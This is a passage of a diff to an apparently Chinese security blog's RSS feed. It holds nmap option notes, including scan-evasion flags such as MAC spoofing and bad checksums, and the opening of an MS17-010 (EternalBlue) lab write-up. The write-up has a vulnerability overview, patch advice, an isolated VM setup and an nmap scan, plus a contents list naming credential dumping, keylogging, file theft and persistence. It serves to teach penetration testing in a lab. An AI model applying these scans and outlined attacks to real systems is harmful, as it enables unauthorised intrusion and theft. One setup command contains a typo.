-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：探测速率控制.每次探测间隔100ms&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --max-rate 10 192.168.1.100&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="--min-rate"&gt;&lt;code&gt;--min-rate&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：最小速率.确保扫描速度不低于每秒100个包。&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --min-rate 100 192.168.1.100&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="--max-retries"&gt;&lt;code&gt;--max-retries&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：最大重试次数&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --max-retries 1 192.168.1.100&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="--max-retries-1"&gt;&lt;code&gt;--max-retries&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：最大重试次数&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --max-retries 1 192.168.1.100&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id="--min-parallelism----max-parallelism"&gt;&lt;code&gt;--min-parallelism / --max-parallelism&lt;/code&gt;
-&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：并行度&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --min-parallelism 10 --max-parallelism 100 192.168.1.100&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：添加随机数据，在每个包后添加指定长度的随机数据。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --data-length 100 192.168.1.100&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h3 id="--ttl"&gt;&lt;code&gt;--ttl&lt;/code&gt;
 &lt;/h3&gt;&lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：设置TTL值&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --ttl 64 192.168.1.100&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;</description></item><item><title>【实践】MS17-010漏洞利用</title><link>http://localhost:1313/p/%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</link><pubDate>Tue, 30 Dec 2025 16:23:12 +0800</pubDate><guid>http://localhost:1313/p/%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</guid><description/></item><item><title>渗透测试基础</title><link>http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</link><pubDate>Tue, 30 Dec 2025 14:51:56 +0800</pubDate><guid>http://localhost:1313/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/</guid><description>&lt;h1 id="渗透测试基础"&gt;渗透测试基础
+&lt;/ul&gt;
+&lt;h3 id="--spoof-mac"&gt;&lt;code&gt;--spoof-mac&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：MAC地址欺骗&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --spoof-mac 00:11:22:33:44:55 192.168.1.100&lt;/code&gt;、&lt;code&gt;nmap --spoof-mac 0 # 随机MAC地址&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="--badsum"&gt;&lt;code&gt;--badsum&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：发送错误校验和&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --badsum 192.168.1.100&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="权限与运行模式"&gt;权限与运行模式
+&lt;/h2&gt;&lt;h3 id="--privileged----unprivileged"&gt;&lt;code&gt;--privileged&lt;/code&gt; / &lt;code&gt;--unprivileged&lt;/code&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：当以非root用户运行时模拟原始套接字。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --unprivileged 192.168.1.100 # 非特权模式&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="附件--nmappdf"&gt;附件 &lt;a class="link" href="nmap.pdf" &gt;nmap.pdf&lt;/a&gt;
+&lt;/h2&gt;</description></item><item><title>【攻防实践】MS17-010漏洞利用</title><link>http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</link><pubDate>Tue, 30 Dec 2025 16:23:12 +0800</pubDate><guid>http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</guid><description>&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010.png" alt="Featured image of post 【攻防实践】MS17-010漏洞利用" /&gt;&lt;h1 id="ms17-010漏洞利用"&gt;MS17-010漏洞利用
+&lt;/h1&gt;&lt;div class="custom-toc"&gt;
+&lt;h3&gt;目录&lt;/h3&gt;
+&lt;nav id="TableOfContents"&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#实践概览"&gt;实践概览&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#ms17-010漏洞"&gt;MS17-010漏洞&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#环境配置"&gt;环境配置&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#实践步骤"&gt;实践步骤&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#隔离网络环境配置与端口扫描"&gt;隔离网络环境配置与端口扫描&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#一在-vmware-中创建并分配-lan-区段对-kali-和-win7-执行相同操作"&gt;一、在 VMware 中创建并分配 LAN 区段（对 Kali 和 Win7 执行相同操作）：&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#二配置-win7-的静态ip并关闭防火墙"&gt;二、配置 Win7 的静态IP并关闭防火墙&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#三配置kali的静态ip地址并测试二者连通性"&gt;三、配置Kali的静态IP地址并测试二者连通性&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#四nmap扫描结果分析"&gt;四、Nmap扫描结果分析&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#metasploit扫描与漏洞利用"&gt;Metasploit扫描与漏洞利用&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#一启动metasploit框架root"&gt;一、启动Metasploit框架（root）：&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#二搜索ms17-010模块"&gt;二、搜索&lt;code&gt;ms17-010&lt;/code&gt;模块：&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#三探测目标主机"&gt;三、探测目标主机&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#四漏洞利用"&gt;四、漏洞利用&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#典型的后渗透攻击行为"&gt;典型的“后渗透”攻击行为&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#一凭据窃取"&gt;一、凭据窃取&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#1-导出哈希值hashdump"&gt;1. 导出哈希值（Hashdump）&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#2-抓取内存中的明文密码mimikatz"&gt;2. 抓取内存中的明文密码（Mimikatz）&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#二隐私监控与取证monitoring"&gt;二、隐私监控与取证（Monitoring）&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#1实时屏幕截图"&gt;1、实时屏幕截图&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#2-键盘记录keylogging"&gt;2. 键盘记录（Keylogging）&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#3-文件窃取与上传"&gt;3. 文件窃取与上传&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#三metasploit持久化后门攻击"&gt;三、Metasploit持久化后门攻击&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="#利用windows服务机制实现权限维持"&gt;利用Windows服务机制实现权限维持&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#相关原理"&gt;相关原理&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#四shell"&gt;四、Shell&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/nav&gt;
+&lt;/div&gt;
+&lt;h2 id="实践概览"&gt;实践概览
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;名称&lt;/strong&gt;：MS17-010漏洞利用&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;目的&lt;/strong&gt;：&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;时间&lt;/strong&gt;：2025年12月30日&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;风险说明&lt;/strong&gt;：本实验在完全隔离的虚拟化实验室环境下进行，仅用于教育或授权测试&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="ms17-010漏洞"&gt;MS17-010漏洞
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;名称&lt;/strong&gt;：MS17-010&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;别名&lt;/strong&gt;：永恒之蓝（EternalBlue）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;公开时间&lt;/strong&gt;：2017.3.14（补丁发布）；2017.4.14（攻击工具公开）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;相关CVE&lt;/strong&gt;：CVE-2017-0143；CVE-2017-0144；CVE-2017-0145；CVE-2017-0146；CVE-2017-0148 （远程代码执行）；CVE-2017-0147 （信息泄露）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;相关协议&lt;/strong&gt;：服务器消息块 1.0 （SMBv1）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;相关端口&lt;/strong&gt;：TCP &lt;strong&gt;445&lt;/strong&gt;（主要）；&lt;strong&gt;139&lt;/strong&gt;（次要）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;漏洞原理&lt;/strong&gt;：源于 Windows 内核处理 SMBv1 协议请求的缓冲区溢出。在处理文件扩展属性转换时，系统因错误计算内存大小，导致攻击者可以发送精心构造的数据包，在内核权限下执行任意代码。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;破坏性&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;无需用户交互&lt;/strong&gt;：攻击者只需向目标主机的445端口发送恶意数据包即可入侵，无需用户点击/打开任何文件&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;危害等级高&lt;/strong&gt;：成功利用后攻击者可在目标系统上执行任意操作，如安装恶意程序、窃取数据、加密文件（勒索软件）或创建后门&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;易于蠕虫化传播&lt;/strong&gt;：&lt;strong&gt;WannaCry&lt;/strong&gt; 勒索病毒采用的方式，导致其在全球范围内像蠕虫一样自动、快速地蔓延&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;影响范围&lt;/strong&gt;：此漏洞影响当时几乎所有未打补丁的 Windows 版本，主要包括：
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;桌面系统&lt;/strong&gt;：Windows XP, Vista, 7, 8, 8.1, Windows 10 (早期版本)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;服务器系统&lt;/strong&gt;：Windows Server 2003, 2008, 2008 R2, 2012, 2012 R2, 2016&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;漏洞修复：安装官方安全补丁——Windows Update 或访问微软官方安全公告手动下载并安装编号为&lt;strong&gt;KB4013389&lt;/strong&gt; 的补丁。或手动：&lt;strong&gt;禁用 SMBv1 协议&lt;/strong&gt;、&lt;strong&gt;网络层面封堵&lt;/strong&gt;、&lt;strong&gt;使用入侵防御系统（IPS）&lt;/strong&gt;、&lt;strong&gt;最小化网络暴露&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="环境配置"&gt;环境配置
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;虚拟环境&lt;/strong&gt;：VMware Workstation 17 Pro - 17.0.0 build-20800274&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;靶机&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;系统&lt;/strong&gt;：Windows 7 Enterprise x64&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;CPU&lt;/strong&gt;：11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;网络&lt;/strong&gt;：LAN（IPv4:10.0.0.17/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULL）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;攻击机&lt;/strong&gt;：
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;系统&lt;/strong&gt;：Linux kali 6.12.25-amd64&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;CPU&lt;/strong&gt;：11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;网络&lt;/strong&gt;：LAN（IPv4:10.0.0.223/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULL）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="实践步骤"&gt;实践步骤
+&lt;/h2&gt;&lt;h3 id="隔离网络环境配置与端口扫描"&gt;隔离网络环境配置与端口扫描
+&lt;/h3&gt;&lt;h4 id="一在-vmware-中创建并分配-lan-区段对-kali-和-win7-执行相同操作"&gt;一、在 VMware 中创建并分配 LAN 区段（对 Kali 和 Win7 执行相同操作）：
+&lt;/h4&gt;&lt;p&gt;打开&lt;strong&gt;设置（Setting）&lt;/strong&gt; -&amp;gt; 选择&lt;strong&gt;网络适配器（Network Adapter）&lt;/strong&gt; -&amp;gt; 右侧点击&lt;strong&gt;LAN区段（LAN Segment）&lt;strong&gt;单选框 -&amp;gt; 点击下方“&lt;strong&gt;LAN区段&amp;hellip;&lt;/strong&gt;”按钮 -&amp;gt; 在弹出的窗口中点击&lt;/strong&gt;添加（Add）&lt;/strong&gt; -&amp;gt; 输入名称**“MS17-010_Experiment”** -&amp;gt; 点击&lt;strong&gt;确定&lt;/strong&gt; -&amp;gt; 在&lt;strong&gt;下拉菜单&lt;/strong&gt;中选中刚刚创建的LAN区段 -&amp;gt; 点击&lt;strong&gt;确定&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1.png"
+width="846"
+height="630"
+srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1_hu_4956252a3246f35d.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1_hu_14038309d84fe612.png 1024w"
+loading="lazy"
+alt="1"
+class="gallery-image"
+data-flex-grow="134"
+data-flex-basis="322px"
+&gt;&lt;/p&gt;
+&lt;h4 id="二配置-win7-的静态ip并关闭防火墙"&gt;二、配置 Win7 的静态IP并关闭防火墙
+&lt;/h4&gt;&lt;p&gt;进入Win7 -&amp;gt; 打开&lt;strong&gt;控制面板&lt;/strong&gt; -&amp;gt; &lt;strong&gt;网络和 Internet&lt;/strong&gt; -&amp;gt; &lt;strong&gt;网络和共享中心&lt;/strong&gt; -&amp;gt; &lt;strong&gt;更改适配器设置&lt;/strong&gt; -&amp;gt; 右键点击&lt;strong&gt;本地连接&lt;/strong&gt; -&amp;gt; &lt;strong&gt;属性&lt;/strong&gt; -&amp;gt; 双击&lt;strong&gt;Internet 协议版本4（TCP/IPv4）&lt;/strong&gt; -&amp;gt; 选择使用静态IP地址（IP地址：10.0.0.17 | 子网掩码：255.255.255.0 | 默认网关：空） -&amp;gt; 点击&lt;strong&gt;确定&lt;/strong&gt;退出 -&amp;gt; 在**“网络与共享中心”&lt;strong&gt;点击&lt;/strong&gt;Windows防火墙** -&amp;gt; 选择**“打开或关闭Windows防火墙”** -&amp;gt; 全部关闭（PS：没打补丁不关闭防火墙也能成功）&lt;/p&gt;
+&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2.png"
+width="796"
+height="557"
+srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2_hu_6e6b4b24c64e1825.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2_hu_8781c3778f402f07.png 1024w"
+loading="lazy"
+alt="2"
+class="gallery-image"
+data-flex-grow="142"
+data-flex-basis="342px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/3.png"
+width="797"
+height="560"
+srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/3_hu_4a19f101894a0724.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/3_hu_8d39d4cfdd1dde3d.png 1024w"
+loading="lazy"
+alt="3"
+class="gallery-image"
+data-flex-grow="142"
+data-flex-basis="341px"
+&gt;&lt;/p&gt;
+&lt;h4 id="三配置kali的静态ip地址并测试二者连通性"&gt;三、配置Kali的静态IP地址并测试二者连通性
+&lt;/h4&gt;&lt;p&gt;打开终端 -&amp;gt; &lt;code&gt;ip addr&lt;/code&gt;指令查看网卡名称（通常为&lt;code&gt;eth0&lt;/code&gt;） -&amp;gt; 手动分配IP地址：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo systemctl stop NetworkMaager &lt;span class="c1"&gt;# 关闭NetworkManager服务——Kali 默认运行NetworkManager服务。当手动使用ip命令修改接口状态时，NetworkManager会检测到接口配置发生了变化。如果该接口被它接管，它会根据自己的配置文件（通常是DHCP或“自动连接”）立即重置接口，从而抹掉刚刚手动添加的IP地址&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo ip addr add 10.0.0.223/24 dev eth0 &lt;span class="c1"&gt;# 将IP地址10.0.0.223分配给eth0网卡&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo ip link &lt;span class="nb"&gt;set&lt;/span&gt; eth0 up &lt;span class="c1"&gt;# 激活eth0网卡，让它开始工作&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;-&amp;gt; 再次输入&lt;code&gt;ip addr&lt;/code&gt;验证&lt;code&gt;eth0&lt;/code&gt;的IP地址 -&amp;gt; 测试两者连通性并进行Namp扫描：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ping 10.0.0.17 -c &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="c1"&gt;# 只发送4个数据包&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -n -sV -sC -T4 10.0.0.17 &lt;span class="c1"&gt;# 不进行DNS解析，使用默认的Nmap脚本探测服务/版本信息&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4.png"
+width="867"
+height="670"
+srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4_hu_f195f9051ac4a590.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4_hu_1a4fbf30a2c3580b.png 1024w"
+loading="lazy"
+alt="4"
+class="gallery-image"
+data-flex-grow="129"
+data-flex-basis="310px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/5.png"
+width="862"
+height="211"
+srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/5_hu_bd77efe044127f79.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/5_hu_1c57bebc6d421cb9.png 1024w"
+loading="lazy"
+alt="5"
+class="gallery-image"
+data-flex-grow="408"
+data-flex-basis="980px"
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/6.png"
+width="867"
+height="626"
+srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/6_hu_aa79e7e1bdfa8979.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/6_hu_fe78ea29aece5c50.png 1024w"
+loading="lazy"
+alt="6"
+class="gallery-image"
+data-flex-grow="138"
+data-flex-basis="332px"
+&gt;&lt;/p&gt;
+&lt;h4 id="四nmap扫描结果分析"&gt;四、Nmap扫描结果分析
+&lt;/h4&gt;&lt;p&gt;上述Nmap扫描结果如下所示：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
+&lt;/span&gt;&lt;span class="lnt"&gt; 2
+&lt;/span&gt;&lt;span class="lnt"&gt; 3
+&lt;/span&gt;&lt;span class="lnt"&gt; 4
+&lt;/span&gt;&lt;span class="lnt"&gt; 5
+&lt;/span&gt;&lt;span class="lnt"&gt; 6
+&lt;/span&gt;&lt;span class="lnt"&gt; 7
+&lt;/span&gt;&lt;span class="lnt"&gt; 8
+&lt;/span&gt;&lt;span class="lnt"&gt; 9
+&lt;/span&gt;&lt;span class="lnt"&gt;10
+&lt;/span&gt;&lt;span class="lnt"&gt;11
+&lt;/span&gt;&lt;span class="lnt"&gt;12
+&lt;/span&gt;&lt;span class="lnt"&gt;13
+&lt;/span&gt;&lt;span class="lnt"&gt;14
+&lt;/span&gt;&lt;span class="lnt"&gt;15
+&lt;/span&gt;&lt;span class="lnt"&gt;16
+&lt;/span&gt;&lt;span class="lnt"&gt;17
+&lt;/span&gt;&lt;span class="lnt"&gt;18
+&lt;/span&gt;&lt;span class="lnt"&gt;19
+&lt;/span&gt;&lt;span class="lnt"&gt;20
+&lt;/span&gt;&lt;span class="lnt"&gt;21
+&lt;/span&gt;&lt;span class="lnt"&gt;22
+&lt;/span&gt;&lt;span class="lnt"&gt;23
+&lt;/span&gt;&lt;span class="lnt"&gt;24
+&lt;/span&gt;&lt;span class="lnt"&gt;25
+&lt;/span&gt;&lt;span class="lnt"&gt;26
+&lt;/span&gt;&lt;span class="lnt"&gt;27
+&lt;/span&gt;&lt;span class="lnt"&gt;28
+&lt;/span&gt;&lt;span class="lnt"&gt;29
+&lt;/span&gt;&lt;span class="lnt"&gt;30
+&lt;/span&gt;&lt;span class="lnt"&gt;31
+&lt;/span&gt;&lt;span class="lnt"&gt;32
+&lt;/span&gt;&lt;span class="lnt"&gt;33
+&lt;/span&gt;&lt;span class="lnt"&gt;34
+&lt;/span&gt;&lt;span class="lnt"&gt;35
+&lt;/span&gt;&lt;span class="lnt"&gt;36
+&lt;/span&gt;&lt;span class="lnt"&gt;37
+&lt;/span&gt;&lt;span class="lnt"&gt;38
+&lt;/span&gt;&lt;span class="lnt"&gt;39
+&lt;/span&gt;&lt;span class="lnt"&gt;40
+&lt;/span&gt;&lt;span class="lnt"&gt;41
+&lt;/span&gt;&lt;span class="lnt"&gt;42
+&lt;/span&gt;&lt;span class="lnt"&gt;43
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;┌──&lt;span class="o"&gt;(&lt;/span&gt;kali㉿kali&lt;span class="o"&gt;)&lt;/span&gt;-&lt;span class="o"&gt;[&lt;/span&gt;~&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;└─$ nmap -n -sV -sC -T4 10.0.0.17
